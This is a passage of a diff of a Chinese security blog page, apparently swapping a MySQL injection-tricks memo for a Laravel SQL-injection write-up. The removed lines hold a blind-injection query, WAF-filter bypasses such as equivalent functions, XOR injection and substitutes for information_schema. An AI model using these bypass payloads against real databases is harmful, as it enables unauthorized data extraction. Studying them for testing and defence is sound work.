-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and (ascii(substr(database(),1,1))) between 1 and 190;</span><br></pre></td></tr></table></figure>
-
-<p><strong>使用strcmp(str1,str2)</strong></p>
-<blockquote>
-<p>若所有的字符串均相同，则返回<code>STRCMP()</code>，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</p>
-</blockquote>
-<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gr1cfj1sn7j30tf07dq4x.jpg" alt="QQ截图20210531091711"></p>
-<h3 id="7-等价函数变量饶过"><a href="#7-等价函数变量饶过" class="headerlink" title="7)等价函数变量饶过"></a>7)等价函数变量饶过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.hex()、bin() &#x3D;&#x3D;&gt; ascii()</span><br><span class="line"></span><br><span class="line">2.sleep() &#x3D;&#x3D;&gt;benchmark()</span><br><span class="line"></span><br><span class="line">3.concat_ws()&#x3D;&#x3D;&gt;group_concat()</span><br><span class="line"></span><br><span class="line">4.mid()、substr() &#x3D;&#x3D;&gt; substring()</span><br><span class="line"></span><br><span class="line">5.@@user &#x3D;&#x3D;&gt; user()</span><br><span class="line"></span><br><span class="line">6.@@datadir &#x3D;&#x3D;&gt; datadir()</span><br><span class="line"></span><br><span class="line">7.@@version &#x3D;&#x3D;&gt; version()</span><br><span class="line"></span><br><span class="line">8.&amp;&amp;&#x3D;&#x3D;&gt;and</span><br><span class="line"></span><br><span class="line">9.||&#x3D;&#x3D;&gt;or</span><br><span class="line"></span><br><span class="line">10.|&#x3D;&#x3D;&gt;xor</span><br></pre></td></tr></table></figure>
-
-<h3 id="8-异或注入"><a href="#8-异或注入" class="headerlink" title="8)异或注入"></a>8)异或注入</h3><blockquote>
-<p>在and,or ,|,&amp;&amp;,||等符号被过滤的情况下，可以采用异或注入达到注入的目的。</p>
-</blockquote>
-<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gr1ft5dvypj30z506omxd.jpg" alt="QQ截图20210531111402"></p>
-<p>1^1=0    1^0=0 其他的自己测。数据库select 1^0;就可以</p>
-<h3 id="9-information-schema被过滤"><a href="#9-information-schema被过滤" class="headerlink" title="9)information_schema被过滤"></a>9)<strong>information_schema被过滤</strong></h3><blockquote>
-<p>innodb引擎可用mysql.innodb_table_stats、innodb_index_stats，日志将会把表、键的信息记录到这两个表中除此之外，系统表sys.schema_table_statistics_with_buffer、sys.schema_auto_increment_columns用于记录查询的缓存，某些情况下可代替information_schema</p>
-<p>JOin也是可以的。</p>
-</blockquote>
-<p>推荐：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7169#toc-20">https://xz.aliyun.com/t/7169#toc-20</a></p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vdUoQU2WS7zf0EKHFYKNvg">https://mp.weixin.qq.com/s/vdUoQU2WS7zf0EKHFYKNvg</a></p>
-<p>骚姿势:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5505">https://xz.aliyun.com/t/5505</a></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gt50tqideaj30p3095whb.jpg" alt="image-20210804195832021"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5331">https://xz.aliyun.com/t/5331</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/199156.html">https://www.freebuf.com/column/199156.html</a></p>
 
     </article>
     <!-- license  -->
@@ -583,8 +502,8 @@ height:50vh;
                 Author：<a href="http://example.com">
                         R0ser1
                     </a>
-                    <p>发表日期：<a href="http://example.com/2021/07/17/Mysql%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%A4%87%E5%BF%98%E5%BD%95/">
-                            July 17th 2021, 9:47:00 pm
+                    <p>发表日期：<a href="http://example.com/2021/08/04/Laravel%E4%B8%8D%E8%A7%84%E8%8C%83%E5%86%99%E6%B3%95%E5%AF%BC%E8%87%B4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+                            August 4th 2021, 8:20:00 pm
                         </a>
                     <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可
                     </p>
@@ -594,20 +513,13 @@ height:50vh;
             <ul class="post-paginator">
                 <li class="next">
                     
-                        <div class="nextSlogan">Next Post</div>
-                        <a href="/2021/07/20/%E5%AE%89%E5%8D%93%E6%97%A0%E6%B3%95%E6%8A%93%E5%8F%96HTTPS%E9%97%AE%E9%A2%98/" title="安卓无法抓取HTTPS问题">
-                            <div class="nextTitle">
-                                安卓无法抓取HTTPS问题
-                            </div>
-                        </a>
-                        
                 </li>
                 <li class="previous">
                     
                         <div class="prevSlogan">Previous Post</div>
-                        <a href="/2021/07/17/Tryhackme%E8%AE%B0%E5%BD%95liunx%E6%8F%90%E6%9D%83/" title="Tryhackme记录liunx提权">
+                        <a href="/2021/08/03/ThinkPHP5-x%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="ThinkPHP5.x注入漏洞学习">
                             <div class="prevTitle">
-                                Tryhackme记录liunx提权
+                                ThinkPHP5.x注入漏洞学习
                             </div>
                         </a>
                         
@@ -722,7 +634,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MYSQL%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7"><span class="toc-number">1.</span> <span class="toc-text">MYSQL一些技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E5%9F%BA%E7%A1%80%E9%A5%B6%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">0)基础饶过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.2.</span> <span class="toc-text">1)过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">2)过滤单引号：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">1.4.</span> <span class="toc-text">3)过滤注释符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7"><span class="toc-number">1.5.</span> <span class="toc-text">4)过滤逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%BF%87%E6%BB%A4%E7%AD%89%E5%8F%B7"><span class="toc-number">1.6.</span> <span class="toc-text">5)过滤等号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%BF%87%E6%BB%A4%E8%BF%87%E6%BB%A4%E6%AF%94%E8%BE%83%E7%AC%A6%E5%8F%B7-%EF%BC%88-lt-%E5%92%8C-gt-%EF%BC%89"><span class="toc-number">1.7.</span> <span class="toc-text">6)过滤过滤比较符号 （ &lt; 和 &gt; ）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E5%8F%98%E9%87%8F%E9%A5%B6%E8%BF%87"><span class="toc-number">1.8.</span> <span class="toc-text">7)等价函数变量饶过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="toc-number">1.9.</span> <span class="toc-text">8)异或注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-information-schema%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">1.10.</span> <span class="toc-text">9)information_schema被过滤</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8D%E8%A7%84%E8%8C%83%E5%86%99%E6%B3%95%E5%AF%BC%E8%87%B4%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">不规范写法导致的SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E4%B8%80"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞环境一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E4%BA%8C"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞环境二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Laravel-5-8-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">Laravel 5.8 SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81-1"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">2.4.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
     </div>
     
     <div class="sidebar sidebar-hide">
